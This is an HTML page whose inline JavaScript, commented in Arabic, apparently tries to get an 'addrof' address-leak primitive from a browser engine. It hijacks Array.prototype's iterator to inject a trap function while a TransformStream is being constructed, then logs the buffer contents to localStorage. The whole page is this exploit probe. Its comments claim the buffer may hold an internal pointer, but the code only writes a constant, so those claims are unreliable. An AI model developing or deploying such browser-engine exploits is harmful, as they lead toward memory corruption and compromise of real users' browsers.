<!DOCTYPE html>
<html>
<body>
<div id="s">Running...</div>
<script>
localStorage.removeItem('addrof_result');
localStorage.removeItem('addrof_data');

let target = {};
let buf = new ArrayBuffer(8);
let view = new DataView(buf);

// هذه الدالة سيتم استدعاؤها من قبل المحرك
// سنستغل هذا الاستدعاء لكتابة شيء في buf
let trap = function() {
    // عندما يستدعيها المحرك، اكتب قيمة في buf
    // هذه القيمة قد تكون مؤشراً داخلياً
    view.setFloat64(0, 1.0, true);
};

try {
    Array.prototype[Symbol.iterator] = function() {
        const a = this;
        let i = 0;
        return {
            next() {
                if (i >= a.length) return { done: true };
                let v = a[i];
                if (a.length === 3 && i >= 1) {
                    localStorage.setItem('addrof_result', 'IDX_' + i + '_TRAP_CALLED');
                    v = trap;
                }
                i++;
                return { value: v, done: false };
            }
        };
    };

    new TransformStream();
    
    // اقرأ ما كتبه الـ trap في buf
    let hex = "";
    for (let j = 0; j < 8; j++) {
        hex += view.getUint8(j).toString(16).padStart(2,'0') + " ";
    }
    localStorage.setItem('addrof_data', hex);
    localStorage.setItem('addrof_result', 'NO_CRASH_DATA_WRITTEN');
    
} catch(e) {
    localStorage.setItem('addrof_result', 'CAUGHT: ' + e.message);
}

Array.prototype[Symbol.iterator] = [][Symbol.iterator];
document.getElementById("s").textContent = "Done.";
</script>
</body>
</html>
